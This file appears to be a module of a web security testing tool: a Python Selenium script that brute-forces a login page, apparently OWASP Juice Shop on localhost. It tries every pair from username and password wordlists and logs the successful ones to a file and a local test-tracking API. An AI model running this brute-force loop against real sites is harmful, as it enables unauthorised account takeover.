from selenium import webdriver
from selenium.webdriver.common.by import By
import requests
import time
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

def brute_force(base_url):
    # driver = webdriver.Firefox()

    api_url = "http://127.0.0.1:3001/api/tests/3"

    headers = {
        "Content-Type": "application/json"
    }

    requests.patch(api_url, json={"status": "In Progress"}, headers=headers)
    
    chrome_options = Options()
    chrome_options.add_argument("--auto-open-devtools-for-tabs")  

    # Enable performance logging
    chrome_options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
    
    driver = webdriver.Chrome(options=chrome_options)

    with open('utils/usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open('utils/passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    url = f'{base_url}/#/login'
    
    driver.get(url)

    results = []

    # time.sleep(8)
    try:
        email_input = driver.find_element("xpath", '//input[@id="email"]')
        password_input = driver.find_element("xpath", '//input[@id="password"]')
        login_button = driver.find_element("xpath", '//button[@id="loginButton"]')

        #for owasp
        dismiss_button = driver.find_element("xpath", "//button[contains(@class, 'close-dialog')]")
        if dismiss_button:
            driver.execute_script("arguments[0].click();", dismiss_button)

        for username in usernames:
            for password in passwords:
                email_input.clear()
                password_input.clear()

                email_input.send_keys(username)
                password_input.send_keys(password)

                login_button.click()

                if driver.current_url != url:
                    results.append((username, password))
                    driver.get(url)

        with open('results/results_brute_force.txt', 'w') as result_file:
            result_file.write("Potential vulnerabilities\n:")
            for username, password in results:
                result_file.write(f"USERNAME: {username}, PASSWORD: {password}\n")
        
       
        requests.patch(api_url, json={"status": "Complete"}, headers=headers)
        requests.patch(api_url, json={"raw_data" : results}, headers=headers)



    except Exception as e:
        with open("results/error.txt", 'w') as f:
            f.write(f"{e}")

    driver.quit()

# brute_force("https://localhost:3002")